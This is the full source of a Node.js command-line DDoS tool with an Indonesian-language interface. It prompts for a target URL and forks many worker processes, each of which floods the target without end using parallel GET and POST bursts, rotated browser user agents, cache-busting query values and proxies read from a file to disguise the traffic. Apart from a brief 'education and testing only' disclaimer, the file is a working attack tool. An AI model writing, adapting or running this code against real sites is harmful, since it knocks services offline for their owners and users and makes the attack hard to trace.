const { fork } = require('child_process');
const fs = require('fs');
const readline = require('readline');
const chalk = require('chalk').default;
const figlet = require('figlet');
const gradient = require('gradient-string');

// Utility functions
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const EXIT_WORDS = ["exit", "keluar", "quit", "q"];

const question = (text) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise(resolve => rl.question(text, ans => {
        const val = ans.trim().toLowerCase();
        if (EXIT_WORDS.includes(val)) {
            console.log(chalk.red("\n[!] Keluar dari tools..."));
            rl.close();
            process.exit(0);
        }
        rl.close();
        resolve(ans);
    }));
};

const progressBar = async (text = "Menyiapkan koneksi", total = 15, delay = 150) => {
    for (let i = 0; i <= total; i++) {
        const filled = chalk.green("█".repeat(i));
        const empty = chalk.gray("░".repeat(total - i));
        const bar = filled + empty;
        process.stdout.write(`\r${chalk.yellow(`[⌛] ${text}:`)} ${bar}`);
        await sleep(delay);
    }
    process.stdout.write(chalk.green(" ✓\n"));
};

const animasiGaris = async (total = 54, delay = 50) => {
    const mid = Math.floor(total / 2);

    for (let i = 0; i <= mid; i++) {
        const kiri = chalk.green("═".repeat(i));
        const kanan = chalk.green("═".repeat(i));
        const tengah = chalk.gray(" ".repeat(total - i * 2));

        const baris = kiri + tengah + kanan;
        process.stdout.write(`\r${baris}`);
        await sleep(delay);
    }

    process.stdout.write("\n");
};

const typeEffect = async (text, delay = 20) => {
    for (const char of text) {
        process.stdout.write(char);
        await sleep(delay);
    }
    process.stdout.write('\n');
};

const showBanner = async () => {
    console.clear();
    const banner = figlet.textSync("DDoS TOOL", { font: "ANSI Shadow" });
    console.log(gradient.instagram.multiline(banner));
    await typeEffect(chalk.magenta("[⚙️] Advanced DDoS Tool - Multi-Process with Proxy Rotation"));
    await animasiGaris();
    await typeEffect(chalk.red("• PERINGATAN: Hanya untuk tujuan edukasi dan testing"));
    await typeEffect(chalk.yellow("• Jangan disalahgunakan, tanggung sendiri resikonya"));
    await typeEffect(chalk.yellow("💡 Tips: ketik exit/quit/keluar/q untuk keluar dari tools"));
    await animasiGaris();
};

// Configuration
const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
  'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0',
  'Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36'
];

const methods = ['GET', 'POST'];

// Utility functions
function randomFrom(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}

function loadProxies() {
  let proxyList = [];
  try {
    if (fs.existsSync('./proxies.txt')) {
      const raw = fs.readFileSync('./proxies.txt', 'utf-8');
      proxyList = raw.split(/\r?\n/).map(p => p.trim())
        .filter(p => p && !p.startsWith('#'))
        .map(p => p.startsWith('http') ? p : `http://${p}`);
      console.log(chalk.green(`📡 ${proxyList.length} proxy berhasil dimuat dari proxies.txt`));
    } else {
      console.log(chalk.yellow('⚠️  File proxies.txt tidak ditemukan, lanjut tanpa proxy.'));
    }
  } catch (error) {
    console.log(chalk.yellow('⚠️  Gagal baca proxies.txt, lanjut tanpa proxy.'));
  }
  return proxyList;
}

// Worker process logic
if (process.argv[2] === 'worker') {
  const axios = require('axios');
  const HttpsProxyAgent = require('https-proxy-agent');
  
  const target = process.argv[3];
  const proxy = process.argv[4] !== 'null' ? process.argv[4] : null;
  const burstCount = parseInt(process.argv[5]) || 10;
  const workerId = parseInt(process.argv[6]) || 0;

  async function sendRequest() {
    const method = randomFrom(methods);
    const userAgent = randomFrom(userAgents);

    const headers = {
      'User-Agent': userAgent,
      'Referer': 'https://google.com',
      'Accept-Language': 'en-US,en;q=0.9',
      'Cache-Control': 'no-cache',
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
      'Accept-Encoding': 'gzip, deflate, br',
      'Connection': 'keep-alive',
      'Upgrade-Insecure-Requests': '1'
    };

    if (method === 'POST') {
      headers['Content-Type'] = 'application/x-www-form-urlencoded';
    }

    const options = { 
      headers, 
      timeout: 8000,
      validateStatus: () => true // Accept all status codes
    };

    if (proxy) {
      try {
        const agent = new HttpsProxyAgent(proxy);
        options.httpAgent = agent;
        options.httpsAgent = agent;
      } catch (error) {
        process.send && process.send(`❌ Worker ${workerId}: Gagal setup proxy - ${error.message}`);
        return;
      }
    }

    try {
      let response;
      if (method === 'POST') {
        response = await axios.post(target, 'param=value&test=' + Math.random(), options);
      } else {
        response = await axios.get(target + '?v=' + Math.random(), options);
      }
      
      process.send && process.send(`✅ Worker ${workerId}: ${method} ${response.status} via ${proxy || 'no proxy'}`);
    } catch (error) {
      process.send && process.send(`❌ Worker ${workerId}: ${method} via ${proxy || 'no proxy'} - ${error.code || error.message}`);
    }
  }

  async function attackLoop() {
    while (true) {
      // Burst: kirim burstCount request paralel sekaligus
      const promises = [];
      for (let i = 0; i < burstCount; i++) {
        promises.push(sendRequest());
      }
      await Promise.allSettled(promises);

      // Delay random 50-200 ms
      await sleep(Math.floor(Math.random() * 150) + 50);
    }
  }

  attackLoop();
  return;
}

// Main process logic
async function startAttack() {
  await showBanner();
  await progressBar("Memuat konfigurasi", 10, 100);
  
  const proxyList = loadProxies();
  
  const target = await question(
    chalk.cyan('\n ┌─╼') + chalk.red('[DDoS') + chalk.hex('#FFA500')('⚡') + chalk.red('TOOL]') + '\n' +
    chalk.cyan(' ├──╼') + chalk.yellow('Target URL (contoh: http://example.com)') + '\n' +
    chalk.cyan(' └────╼') + ' ' + chalk.red('❯') + chalk.hex('#FFA500')('❯') + chalk.blue('❯ ')
  );
  
  if (!target) {
    console.log(chalk.red("\n❌ Target tidak boleh kosong!"));
    process.exit(1);
  }

  const workersInput = await question(
    chalk.cyan('\n ┌─╼') + chalk.red('[DDoS') + chalk.hex('#FFA500')('⚡') + chalk.red('TOOL]') + '\n' +
    chalk.cyan(' ├──╼') + chalk.yellow('Jumlah worker (default: 50)') + '\n' +
    chalk.cyan(' └────╼') + ' ' + chalk.red('❯') + chalk.hex('#FFA500')('❯') + chalk.blue('❯ ')
  );
  
  let numWorkers = parseInt(workersInput);
  if (isNaN(numWorkers) || numWorkers <= 0) numWorkers = 50;

  const burstInput = await question(
    chalk.cyan('\n ┌─╼') + chalk.red('[DDoS') + chalk.hex('#FFA500')('⚡') + chalk.red('TOOL]') + '\n' +
    chalk.cyan(' ├──╼') + chalk.yellow('Request per burst (default: 10)') + '\n' +
    chalk.cyan(' └────╼') + ' ' + chalk.red('❯') + chalk.hex('#FFA500')('❯') + chalk.blue('❯ ')
  );
  
  let burstCount = parseInt(burstInput);
  if (isNaN(burstCount) || burstCount <= 0) burstCount = 10;

  console.log(chalk.green(`\n🚀 Menyerang ${target} dengan ${numWorkers} worker dan ${burstCount} request per burst...\n`));
  console.log(chalk.yellow('ℹ️  Tekan Ctrl+C untuk menghentikan serangan\n'));

  const workers = [];
  let activeWorkers = 0;
  let totalRequests = 0;
  let successfulRequests = 0;
  let failedRequests = 0;

  // Stats display update interval
  setInterval(() => {
    process.stdout.write(`\r📊 Stats: ${activeWorkers} workers | ${totalRequests} requests | ${successfulRequests} success | ${failedRequests} failed`);
  }, 1000);

  for (let i = 0; i < numWorkers; i++) {
    const proxy = proxyList.length > 0 ? proxyList[i % proxyList.length] : null;
    const worker = fork(__filename, ['worker', target, proxy, burstCount, i]);
    
    worker.on('message', (msg) => {
      if (msg.includes('✅')) {
        successfulRequests++;
        totalRequests++;
      } else if (msg.includes('❌')) {
        failedRequests++;
        totalRequests++;
      }
      console.log(chalk.gray(`   ${msg}`));
    });
    
    worker.on('exit', (code) => {
      activeWorkers--;
      console.log(chalk.yellow(`Worker ${i} keluar dengan kode ${code}`));
    });
    
    workers.push(worker);
    activeWorkers++;
  }

  // Handle process termination
  process.on('SIGINT', () => {
    console.log(chalk.red('\n\n🛑 Menghentikan semua worker...'));
    workers.forEach(worker => worker.kill());
    console.log(chalk.green(`\n📊 Final Stats: ${totalRequests} requests | ${successfulRequests} success | ${failedRequests} failed`));
    process.exit(0);
  });
}

// Start the application
(async () => {
  try {
    await startAttack();
  } catch (error) {
    console.log(chalk.red(`\n❌ Error: ${error.message}`));
    process.exit(1);
  }
})();